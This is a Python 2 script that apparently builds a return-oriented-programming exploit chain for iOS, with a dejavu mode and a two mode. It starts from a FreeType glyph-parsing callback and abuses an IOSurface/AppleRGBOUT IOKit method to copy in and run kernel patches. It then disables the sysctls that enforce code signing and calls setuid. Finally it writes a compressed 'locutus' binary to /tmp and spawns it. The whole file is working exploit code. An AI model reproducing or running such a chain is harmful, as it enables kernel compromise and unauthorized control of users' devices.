#!/opt/local/bin/python2.6
import sys, base64, shlex, zlib, os
import dmini
from world1 import *
import goo
import cPickle as pickle

four_dot_three = '4.3' in os.environ['VERSION']

if len(sys.argv) != 5:
    print >> sys.stderr, "usage: python catalog.py dejavu|two cache kern patchfile"
    sys.exit(1)

mode, cachefile, kernfile, patchfile = sys.argv[1:]
assert mode in ['dejavu', 'two']
patchfp = open(patchfile)

def read(f, size):
    result = f.read(size)
    if len(result) != size: raise Exception('truncated')
    return result

lib_paths = set(['/usr/lib/libSystem.B.dylib'])
def add_lib(short, path):
    dmini.cur.add_lib(short, path)
    lib_paths.add(path)

def dbg_result():
    if True:
        result, resultp = stackunkpair()
        store_r0_to(resultp)
        back = sys._getframe().f_back
        funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)


dmini.init(kernfile, False)

code_addr = 0x80000400 # XXX
weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-8]
count = 0
stuff = ''
kreturn = pointed('')
while True:
    namelen = patchfp.read(4)
    if len(namelen) == 0: break
    if len(namelen) != 4: raise Exception('truncated')
    name = read(patchfp, struct.unpack('I', namelen)[0])
    addr, = struct.unpack('I', read(patchfp, 4))
    data = read(patchfp, struct.unpack('I', read(patchfp, 4))[0])
    if addr == 0 or len(data) == 0 or name.startswith('+'): # in place only
        continue
    stuff += I(addr, len(data)) + data
    count += 1
weirdfile = pointed(weirdfile + I(count, pointer(kreturn)) + stuff)
init('R4', 'R5', 'R6', 'R7', 'PC', pic=True)
funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
set_fwd('PC', code_addr)
kstuff = finalize(None, must_be_simple=False)

assert len(kstuff) < 0x1000

dmini.init(cachefile, True)

add_lib('ft', '/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
add_lib('iosurface', '/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface')
add_lib('iokit', '/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
add_lib('libz', '/usr/lib/libz.dylib')

if four_dot_three:
    def wrap(num):
        if (num & 0xf0000000) == 0x30000000:
            return reloc(3, num, alignment=0x1000)
        else:
            return num
    dmini.cur.wrap = wrap

if mode == 'dejavu':
    init('R4', 'R5', 'PC')
    make_r7_avail()
    set_sp_to_sp()
else:
    init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
make_avail()

if mode == 'dejavu':
    load_r0_from(reloc(0xe, 0x558))
    load_r0_r0()
    zlocutusp, zlocutuspp = stackunkpair()
    store_r0_to(zlocutuspp)

if mode == 'dejavu' and four_dot_three:
    p_1000, _1000 = stackunkpair()
    p_100c, _100c = stackunkpair()
    funcall('_dyld_get_image_header', 0)
    store_r0_to(p_1000)
    add_r0_by(0xc)
    store_r0_to(p_100c)

else:
    p_1000 = ptrI(0x1000)
    _1000 = 0x1000
    _100c = 0x100c


funcall('_mach_task_self')
task_self, task_self_p = stackunkpair()
store_r0_to(task_self_p)

# do not put any code here!  we need mach_task_self in r0

#protp = ptrI(0)
zerop = ptrI(0)

if mode == 'dejavu':
    # before we remap, save 0x1000 so we can have it back
    # only required in Safari

    sizep = ptrI(0x1000)
    memory_entry, memory_entryp = stackunkpair()
    funcall('_mach_make_memory_entry', None, sizep, _1000, 5, memory_entryp, 0); dbg_result()
    funcall('_munmap', p_1000, 0x1000, load_r0=True); dbg_result()
    funcall('_mmap', p_1000, 0x1000, 3, 0x1001, 0, load_r0=True); dbg_result()

funcall('_memcpy', p_1000, ptr(kstuff), len(kstuff), load_r0=True)
funcall('_mlock', p_1000, 0x1000, load_r0=True); dbg_result()

funcall('iosurface._IOSurfaceWrapClientImage', 1, _100c, 0x41424752, 4, 0x40000, 0);
if mode == 'dejavu':
    surface, surfacep = stackunkpair()
    store_r0_to(surfacep)
funcall('iosurface._IOSurfaceGetID', None)
surface_id, surface_idp = stackunkpair()
store_r0_to(surface_idp)

if mode == 'two':
    # XXX is this necessary? it's from star
    funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))

funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
matching, matchingp = stackunkpair()
store_r0_to(matchingp)
funcall('iokit._IOServiceGetMatchingService', 0, matching)
connect = ptrI(0)
funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()

js = ptrI(surface_id, 0, 9 if four_dot_three else 8, 0)
funcall('iokit._IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)

clear_fwd() # we're not coming back the usual way
heapadd(kreturn, fwd('PC'))
fwd('R7')
set_sp_to_sp()
make_avail()

# do some housekeeping
# (but don't bother if we're going to exec)
if mode == 'dejavu':
    funcall('_CFRelease', surface)
    funcall('iokit._IOServiceClose', connect, load_r0=True)

    funcall('_munmap', p_1000, 0x1000, load_r0=True); dbg_result()
    funcall('_vm_map', task_self_p, p_1000, 0x1000, 1, 0, memory_entry, 0, 0, 5, 5, 2, load_r0=True); dbg_result()

    # the boring stuff

    O_WRONLY = 0x0001
    O_CREAT  = 0x0200
    O_TRUNC  = 0x0400

    funcall('_malloc', reloc(0xa, 0))
    locutusp, locutuspp = stackunkpair()
    store_r0_to(locutuspp)
    funcall('libz._uncompress', None, ptrI(reloc(0xa, 0)), zlocutusp, reloc(0xb, 0)); dbg_result()
    locutus_str = ptr('/tmp/locutus', True)
    funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
    fd, fdp = stackunkpair()
    store_r0_to(fdp)
    #dbg_result()
    funcall('_write', None, locutusp, reloc(0xb, 0))
    dbg_result()
    funcall('_close', fd)
    dbg_result()
    funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
    dbg_result()

funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
dbg_result()

if mode == 'dejavu':
    funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
    dbg_result()
    funcall('_geteuid')
    funcall('_setuid', None); dbg_result()

    #funcall('_printf', ptr('done with shellcode\n', True))

    set_r0_to(1337)
    fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
else:
    funcall('_execl', ptr('/sbin/lunchd', True), 0)

goo.sheap.append(pad(weirdfile, 4))

if mode == 'dejavu':
    final = finalize(reloc(0xd, 0))


    # add sp, #400; pop {r4, r5, pc}
    parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
    print hex(parse_callback)
    actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value

    final = final.unpack()

    open('dejavu.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final}))
else:
    # for two.py
    initializer = dmini.cur.find_basic('+ 5f 13 77 47') # asrs r7, r3, #13; bx lr
    init_sp = 0x10031000
    address = 0x8000

    final = finalize(address)
    #heapdump(final)
    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths}))
